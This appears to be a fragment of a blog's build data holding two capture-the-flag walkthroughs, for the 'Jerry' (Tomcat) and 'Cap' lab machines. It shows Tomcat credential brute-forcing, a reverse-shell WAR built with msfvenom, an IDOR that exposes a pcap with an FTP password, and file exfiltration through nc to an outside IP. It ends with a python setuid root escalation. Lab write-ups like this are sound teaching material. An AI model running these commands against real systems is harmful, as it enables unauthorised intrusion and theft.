flag."},{"id":"/Jerry","metadata":{"permalink":"/Blog/blog/Jerry","editUrl":"https://github.com/danae-pan/Blog/blog/Jerry.md","source":"@site/blog/Jerry.md","title":"Jerry","description":"Task1","date":"2025-04-06T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":3.26,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Jerry","date":"2025-04-06T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Sau","permalink":"/Blog/blog/Sau"},"nextItem":{"title":"Cap","permalink":"/Blog/blog/Cap"}},"content":"### Task1\\n\\nWhich TCP port is open on the remote host?\\n\\nRun nmap to scan for ports\\n\\n```nmap -sS -p- <target_ip>```\\n\\n![alt text](image-j.png)\\n\\nAfter scanning, the port 8080 is revelead to be open, where the http-proxy service is running.\\n\\n### Task 2\\n\\nWhich web server is running on the remote host? Looking for two words.\\n\\nTo find the web server, we need to add the version field on the nmap scan.\\n\\n```nmap -sV -p 8080 <target_ip>```\\n\\n![alt text](image-j-1.png)\\n\\nWe see on the version that the web server is **Apache Tomcat**.\\n\\n### Task 3\\n\\nWhich relative path on the webserver leads to the Web Application Manager?\\n\\nOpen a browser and navigate to the ip address of the target. Remember to specify the port to be 8080.\\n\\nTake a look at the page, to see you can find anything useful. Under **Managing Tomcat** you see a URL to **manager webapp** which might be what is refered as Web Application Manager. It is stated that for security, access is restricted and users are defined in **$CATALINA_HOME/conf/tomcat-users.xml**. This seems like an interesting information, but let\'s first see what the URL gets us. When clicking we get redirected to **/manager/html** where we are asked to input our credential. This is a point we should keep in mind, but for now we got the relative path the question is asking for.\\n\\n### Task 4\\n\\nWhat is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password\\n\\nOn the previous step, we navigated to the **/manager/html** were we were asked for credentials. Since we were not able to authenticate, we show an example in the page of how to add a role to a user for accesssing the manager application. We can try to use those example credentials and see if they work on the login prompt, and they do!\\n\\n![alt text](image-j-6.png)\\n\\nAnother approach to this, is using **Metasploit Framework**. First, run ```msfconsole``` and then ```search tomcat```. There you will find the auxiliary **auxiliary/scanner/http/tomcat_mgr_login** which will attempt to login based on a list of username - password names. To use it, run ```use <number_of_option>``` and then to see what you it is required for you to set ```show options```. \\n\\nTo select the target IP address and the port, run ```set RHOSTS <target_ip>``` and ```set RPORT <target_port>```. Then type ```run``` and you will see that a login attempt was succesfull! As seen, those are the same credentials that were found before. \\n\\n![alt text](image-j-7.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 5\\n\\nWhich file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?\\n\\nAfter authenticating in the previous page, you will see this part in the Web Application Manager page:\\n\\n![alt text](image-j-3.png)\\n\\nWe can see that the file type is **WAR**. \\n\\n### Task 6\\n\\nSubmit the flag located on the user\'s desktop.\\n\\nFrom the previous task, we realised we would be able to upload a war file, which smells like a backdoor we could use for remote code execution. A war file is used to deploy java based applications and we can use it to deploy a reverse shell and gain remote access to the target system. \\n\\nWe can generate a war file using msfvenom \\n\\n```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f war > shell.war```\\n\\nAn open the port that was specified so we can listen to the connection from the target\\n\\n```sudo nc -lvnp <your_port>```\\n\\nThen we navigate to the manager page and upload the war payload. \\nOn the list of applications we can see our deployment \\n\\n![alt text](image-j-8.png)\\n\\nThen we can navigate to the **/shell** path and on our temrminal that we opened the port we can see are connected!\\n\\n![alt text](image-j-9.png)\\n\\nNavigating to the directory **\\\\Users\\\\Administrator\\\\Desktop** and lisitng the direcrtories, we find a folder named flags. \\n\\n![alt text](image-j-10.png)\\n\\nRunning ```type \\"2 for the price of 1.txt\\"``` we get both the user and the root flags."},{"id":"/Cap","metadata":{"permalink":"/Blog/blog/Cap","editUrl":"https://github.com/danae-pan/Blog/blog/Cap.md","source":"@site/blog/Cap.md","title":"Cap","description":"Task 1","date":"2025-03-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":2.7,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Cap","date":"2025-03-25T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Jerry","permalink":"/Blog/blog/Jerry"}},"content":"### Task 1\\n\\nHow many TCP ports are open?\\n\\n```nmap -sS -p- <ip_address>```\\n\\n- -sS: Stealth Scan, the fastest way to scan ports of the most popular protocol (TCP). \\n\\nAfter scanning, 3 TCP ports are showing to be open.\\n\\n![alt text](image-c.png)\\n\\n### Task 2\\n\\nAfter running a \\"Security Snapshot\\", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?\\n\\nUpen the hamburger menu, and click on **Security Snapshot (5 Second PCAP + Analysis)** \\n\\nThis will redirect you ti a URL with something being **data**. \\n\\n### Task 3\\n\\nAre you able to get to other users\' scans?\\n\\nFor this, you can try and change the **id** from **1** to another value. If you try with the value **0** you will see different dashboard, which means you were able to get to other user\'s scans.\\n\\n### Task 4 \\n\\nWhat is the ID of the PCAP file that contains sensative data?\\n\\nThe page that was found before with the **id** equal to **0** is the one that contains sensative data.\\n\\n### Task 5\\n\\nWhich application layer protocol in the pcap file can the sensetive data be found in?\\n\\nWhen you download and open the file from the dashboard page with **id = 0**, inspect the packets from the Wireshark capture. You will soon find that the sensitive data is in the FTP protocol. Where a request is sent with a password in plain text.\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 6\\n\\nTry to ssh to the target ip address with the user name and the password for you obtained in the previous step. You will see that this will succesfully work. \\n\\n```ssh nathan@<target_ip>```\\n\\n![alt text](image-c-2.png)\\n\\n### Task 7\\n\\nGet the user.txt flag from the ftp server.\\n\\n```wget ftp://user:password@ftp.mydomain.com/path/file.ext```\\n\\n![alt text](image-c-1.png)\\n\\nIn your host run ```cat user.txt``` and obtain the user flag.\\n\\n### Task 8\\n\\nWhat is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?\\n\\nFirst clone the reposiroty for using the Linux escalating privelages script. Then make the script executable.\\n\\n```\\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh\\n\\nchmod +x linpeas.sh\\n\\n```\\n\\nStart a Python HTTP server to transfer the script to the target machine.\\n\\n```python3 -m http.server 8080```\\n\\nOn the target machine, log in with the username **nathan** and his credentials, get the file from your host system.\\n\\n```\\ncd /tmp\\nwget http://<host_ip_address>:8080/linpeas.sh -O linpeas.sh\\nchmod +x linpeas.sh\\n./linpeas.sh\\n```\\n\\nand run it saving the output to a text file.\\n```/tmp/linpeas.sh | tee /tmp/linpeas-output.txt```\\n\\nYou can tranfer this text file to your local machine for further analysis by opening a port to \\"listen\\" to a connection and save the incoming data to a new file locally.\\n\\n```nc -lvnp 4444 > linpeas_output.txt```\\n\\nFrom the target machine you can send the file \\n\\n```cat linpeas_output.txt | nc 10.10.14.190 4444```\\n\\nInspecting the file, under **Files with capabilities** the interesting file is **/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip** which indicates potential privilege escalation allowing changing the user ID to another user (including root)\\n\\n![alt text](image-c-3.png)\\n\\n### Task 9 \\n\\nYou can escalate priveleges and switch to root by attempting\\n\\n ```/usr/bin/python3.8 -c \'import os; os.setuid(0); os.system(\\"/bin/bash\\")\'```\\n\\n then find the flag \\n\\n ```find / -name \\"root.txt\\" 2>/dev/null```\\n\\n and read the flag by \\n```cat /root/root.tx/```"}]}}')}}]);